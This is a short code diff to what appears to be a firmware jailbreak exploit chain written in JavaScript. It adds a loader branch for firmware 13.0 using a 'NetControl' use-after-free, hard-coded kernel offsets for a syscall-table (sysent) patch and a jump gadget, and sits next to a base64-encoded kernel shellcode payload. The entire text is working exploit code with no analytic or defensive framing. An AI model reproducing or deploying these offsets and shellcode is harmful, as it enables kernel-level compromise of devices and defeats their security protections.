@@ -65,9 +65,10 @@ function get_syscall(id) {
 async function exploit() {
   if (version.major < 12 || (version.major === 12 && version.minor <= 2)) {
     await load_script('engine/lapse.js');
+  } else if (version.major === 13 && version.minor === 0) {
+    await load_script('engine/netctrl.js');
   } else {
     throw new Error(`${version} exploit is WIP`);
-    //await load_script('engine/lapse.js');
   }
 
   await exploit_main();
@@ -878,6 +879,10 @@ const impl_map = {
   13: {
     0: {
       k_evf_cv_desc: 0x7849d8,
+      // NetControl UAF (kernel base leak + sysent[661] patch).
+      k_kl_lock: 0xe6c20,
+      k_sysent_661: 0x110a760,
+      k_jmp_qword_ptr_rsi: 0x47b31,
       k_shellcode:
         'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',
 
